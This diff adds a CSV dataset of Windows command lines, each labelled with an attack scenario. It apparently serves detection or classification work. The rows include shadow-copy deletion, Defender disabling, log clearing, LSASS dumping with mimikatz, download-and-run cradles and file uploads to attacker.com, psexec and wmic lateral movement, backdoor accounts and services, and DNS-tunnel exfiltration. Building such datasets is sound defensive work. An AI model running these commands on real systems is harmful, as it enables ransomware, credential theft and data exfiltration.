@@ -1,0 +1,115 @@
+commandline,scenario
+systeminfo,ransomware_attack
+net config workstation,ransomware_attack
+net view,ransomware_attack
+dir C:\Users\,ransomware_attack
+"wmic logicaldisk get size,freespace,caption",ransomware_attack
+whoami /all,ransomware_attack
+net localgroup administrators,ransomware_attack
+"accesschk.exe -uwcqv ""Authenticated Users"" * /accepteula",ransomware_attack
+net user ransomuser StrongPass123! /add,ransomware_attack
+net localgroup administrators ransomuser /add,ransomware_attack
+"reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" /v Ransomware /t REG_SZ /d ""C:\temp\encrypt.exe"" /f",ransomware_attack
+sc stop WinDefend,ransomware_attack
+"reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows Defender"" /v DisableAntiSpyware /t REG_DWORD /d 1 /f",ransomware_attack
+vssadmin delete shadows /all /quiet,ransomware_attack
+bcdedit /set {default} recoveryenabled No,ransomware_attack
+bcdedit /set {default} bootstatuspolicy ignoreallfailures,ransomware_attack
+net use Z: \\server\shared_folder /user:domain\user password,ransomware_attack
+"powershell -Command ""Get-ChildItem -Path C:\ -Include *.docx,*.pdf,*.xls,*.xlsx,*.ppt,*.pptx -Recurse | Select-Object FullName""",ransomware_attack
+"certutil.exe -urlcache -split -f ""http://malicious.com/ransomware.exe"" C:\temp\encrypt.exe",ransomware_attack
+C:\temp\encrypt.exe --encrypt-all,ransomware_attack
+del C:\temp\encrypt.exe,ransomware_attack
+wevtutil cl System,ransomware_attack
+wevtutil cl Security,ransomware_attack
+wevtutil cl Application,ransomware_attack
+tasklist,credential_theft
+net user,credential_theft
+net accounts,credential_theft
+qwinsta,credential_theft
+query user,credential_theft
+"powershell -ep bypass -c ""IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/mimikatz.ps1'); Invoke-Mimikatz -Command '""""privilege::debug"""" """"sekurlsa::logonpasswords""""'""",credential_theft
+procdump.exe -accepteula -ma lsass.exe C:\temp\lsass.dmp,credential_theft
+"mimikatz.exe ""privilege::debug"" ""sekurlsa::minidump C:\temp\lsass.dmp"" ""sekurlsa::logonpasswords full"" exit",credential_theft
+"reg query ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon""",credential_theft
+"reg query ""HKLM\SYSTEM\CurrentControlSet\Control\Lsa"" /v Security Packages",credential_theft
+"reg query ""HKCU\Software\ORL\WinVNC3\Password""",credential_theft
+reg save HKLM\SAM C:\temp\sam.hive,credential_theft
+reg save HKLM\SYSTEM C:\temp\system.hive,credential_theft
+reg save HKLM\SECURITY C:\temp\security.hive,credential_theft
+"powershell -ep bypass -c ""Get-Process | Where-Object {$_.ProcessName -like '*chrome*'} | ForEach-Object {Stop-Process $_.Id}""",credential_theft
+"copy ""C:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data\Default\Login Data"" C:\temp\chrome_logins",credential_theft
+"copy ""C:\Users\%USERNAME%\AppData\Roaming\Mozilla\Firefox\Profiles\*.default\logins.json"" C:\temp\firefox_logins",credential_theft
+netsh wlan show profiles,credential_theft
+"netsh wlan show profile name=""CorporateWiFi"" key=clear",credential_theft
+nltest /domain_trusts,credential_theft
+nltest /dsgetdc:DOMAIN.LOCAL,credential_theft
+ipconfig /all,lateral_movement
+arp -a,lateral_movement
+net view,lateral_movement
+nbtstat -A 192.168.1.10,lateral_movement
+"net group ""domain computers"" /domain",lateral_movement
+net use z: \\target-server\c$ /user:domain\validuser ValidPass123!,lateral_movement
+sc query \\target-server,lateral_movement
+"wmic /node:""target-server"" service where (state=""running"") get name",lateral_movement
+psexec.exe \\target-server -u domain\adminuser -p AdminPass123! cmd.exe,lateral_movement
+psexec.exe \\target-server -s cmd.exe,lateral_movement
+psexec.exe \\fileserver -u domain\service_account -p ServicePass123! -c malware.exe,lateral_movement
+"wmic /node:""webserver"" /user:""domain\adminuser"" /password:""AdminPass123!"" process call create ""cmd.exe /c powershell -ep bypass -f \\share\backdoor.ps1""",lateral_movement
+"wmic /node:""dbserver"" process call create ""cmd.exe /c net user hacker Pass123! /add && net localgroup administrators hacker /add""",lateral_movement
+"schtasks /create /S target-server /RU ""SYSTEM"" /SC ONSTART /TN ""Update"" /TR ""powershell -ep bypass -f \\share\payload.ps1""",lateral_movement
+"schtasks /run /S target-server /I /TN ""Update""",lateral_movement
+powershell Enable-PSRemoting -Force,lateral_movement
+powershell Invoke-Command -ComputerName target-server -ScriptBlock {whoami} -Credential domain\adminuser,lateral_movement
+powershell Enter-PSSession -ComputerName target-server -Credential domain\adminuser,lateral_movement
+sekurlsa::pth /user:adminuser /domain:domain.local /ntlm:hash_value /run:cmd.exe,lateral_movement
+crackmapexec smb 192.168.1.0/24 -u adminuser -p AdminPass123! --shares,lateral_movement
+crackmapexec smb 192.168.1.0/24 -u adminuser -H hash_value --sam,lateral_movement
+net user backdooruser BackdoorPass123! /add,persistence_establishment
+net localgroup administrators backdooruser /add,persistence_establishment
+"net localgroup ""remote desktop users"" backdooruser /add",persistence_establishment
+"reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Run"" /v Backdoor /t REG_SZ /d ""C:\ProgramData\backdoor.exe"" /f",persistence_establishment
+"reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" /v SystemService /t REG_SZ /d ""C:\Windows\system32\svchost.exe"" /f",persistence_establishment
+"reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"" /v Userinit /t REG_SZ /d ""C:\Windows\system32\userinit.exe,C:\temp\backdoor.exe"" /f",persistence_establishment
+"schtasks /create /tn ""WindowsOptimizer"" /tr ""C:\temp\backdoor.exe"" /sc daily /st 02:00 /ru ""SYSTEM""",persistence_establishment
+"schtasks /create /tn ""SecurityScan"" /tr ""powershell -WindowStyle Hidden -Exec Bypass -File C:\temp\payload.ps1"" /sc onstart /ru ""SYSTEM""",persistence_establishment
+"sc create BackdoorService binPath= ""C:\temp\backdoor.exe"" start= auto",persistence_establishment
+sc config BackdoorService start= auto,persistence_establishment
+sc start BackdoorService,persistence_establishment
+"wmic /Namespace:(root\Subscription) PATH __EventFilter CREATE Name=""Updater"", EventNameSpace=""root\cimv2"", QueryLanguage=""WQL"", Query=""SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 320""",persistence_establishment
+"copy malicious.dll ""C:\Program Files\LegitimateApp\""",persistence_establishment
+"copy legitimate.exe ""C:\Program Files\LegitimateApp\legitimate.exe""",persistence_establishment
+"copy backdoor.exe ""%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\""",persistence_establishment
+"copy payload.lnk ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\""",persistence_establishment
+"reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe"" /v Debugger /t REG_SZ /d ""C:\temp\backdoor.exe"" /f",persistence_establishment
+bootrec /fixmbr,persistence_establishment
+bootrec /fixboot,persistence_establishment
+attrib -h -r -s C:\bootmgr,persistence_establishment
+copy malicious_bootmgr C:\bootmgr,persistence_establishment
+"dir C:\Users\ /s /b | findstr ""*.pdf *.doc *.docx *.xls *.xlsx *.ppt *.pptx *.txt *.rtf""",data_exfiltration
+"powershell -Command ""Get-ChildItem -Path C:\ -Include *.pdf,*.doc*,*.xls*,*.ppt*,*.txt -Recurse | Where-Object {$_.Length -gt 100KB}""",data_exfiltration
+"findstr /s /m ""confidential"" C:\Users\*.docx",data_exfiltration
+"findstr /s /m ""credit card"" C:\Users\*.txt",data_exfiltration
+"sqlcmd -S localhost -d master -Q ""SELECT name FROM sys.databases""",data_exfiltration
+"sqlcmd -S dbserver -d CustomerDB -Q ""SELECT TOP 10 * FROM Customers""",data_exfiltration
+"sqlcmd -S dbserver -d CustomerDB -Q ""SELECT SSN, CreditCardNumber FROM FinancialRecords"" -o C:\temp\db_dump.txt",data_exfiltration
+"powershell Compress-Archive -Path ""C:\Users\Documents\*.pdf"" -DestinationPath C:\temp\documents.zip",data_exfiltration
+7z a -pstrong_password C:\temp\sensitive_data.7z C:\Users\*\*.docx,data_exfiltration
+tar -czf C:\temp\personal_data.tar.gz C:\Users\Public\*,data_exfiltration
+certutil -encode C:\temp\sensitive_data.zip C:\temp\encoded_data.b64,data_exfiltration
+"powershell -Command ""[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\temp\financial_records.xlsx'))"" > C:\temp\encoded_file.txt",data_exfiltration
+net use Z: \\192.168.1.100\exfil_share /user:anonymous password,data_exfiltration
+"netsh advfirewall firewall add rule name=""AllowOutboundFTP"" dir=out action=allow protocol=TCP localport=21",data_exfiltration
+"netsh advfirewall firewall add rule name=""AllowOutboundHTTP"" dir=out action=allow protocol=TCP localport=80",data_exfiltration
+ftp -s:upload_script.txt 192.168.1.100,data_exfiltration
+"curl -X POST -F ""file=@C:\temp\documents.zip"" http://attacker.com/upload.php",data_exfiltration
+"powershell (New-Object System.Net.WebClient).UploadFile('http://attacker.com/upload.php', 'C:\temp\encoded_data.b64')",data_exfiltration
+wget --post-file=C:\temp\db_dump.txt http://attacker.com/receive.php,data_exfiltration
+dnscat2-client attacker.com --exec ping.exe,data_exfiltration
+iodine -f -P password attacker.com,data_exfiltration
+hping3 -c 10000 -d 100 -E C:\temp\data.txt -s 12345 -p 80 -k attacker.com,data_exfiltration
+copy /b image.jpg + C:\temp\sensitive_data.zip stego_image.jpg,data_exfiltration
+"outguess -k ""password"" -d C:\temp\compressed_data.txt stego_image.jpg",data_exfiltration
+cipher /w:C:\temp,data_exfiltration
+sdelete -p 3 C:\temp\original_files\*,data_exfiltration
+fsutil file createnew C:\temp\dummy_file.dat 104857600 && del C:\temp\dummy_file.dat,data_exfiltration
